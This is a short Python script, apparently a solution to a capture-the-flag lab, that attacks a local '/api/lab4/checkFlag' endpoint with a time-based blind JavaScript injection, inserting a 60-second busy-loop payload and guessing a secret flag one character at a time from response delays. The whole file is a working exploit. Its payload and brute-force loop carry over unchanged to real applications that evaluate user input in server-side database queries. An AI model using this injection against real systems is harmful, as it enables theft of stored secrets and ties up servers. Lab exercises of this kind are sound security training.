import requests
import time
import string
import itertools

url = "http://localhost:3000/api/lab4/checkFlag"
charset = string.ascii_letters + string.digits + "_"

def check_flag(flag):
    injection = "' || this.flag.startsWith(\"%s\")|| (function(){ var start = Date.now(); while (Date.now() - start < 60000);})())})//"
    payload = {
        "flag": injection % flag
    }
    try:
        start_time = time.time()
        response = requests.post(url, json=payload)
        end_time = time.time()
        elapsed_time = end_time - start_time
        return elapsed_time <= 60
    except requests.exceptions.RequestException as e:
        print(f"Errore nella richiesta: {e}")
        return False

def main():
    found = ""
    flag = ""
    end = False #visto che non conosco la lunghezza della flag una volta che ho finito un intero ciclo di caratteri senza averne trovato nessuno corretto finisco
    while True:
        if(end):
            print("flag {}".format(flag[:-1]))
            break
        end = True
        for char in charset:
            flag = found + char
            print(f"flag: {flag}")
            if check_flag(flag):
                print("new char found {}, flag {}".format(char, flag))
                found = flag
                end = False
                break

if __name__ == "__main__":
    main()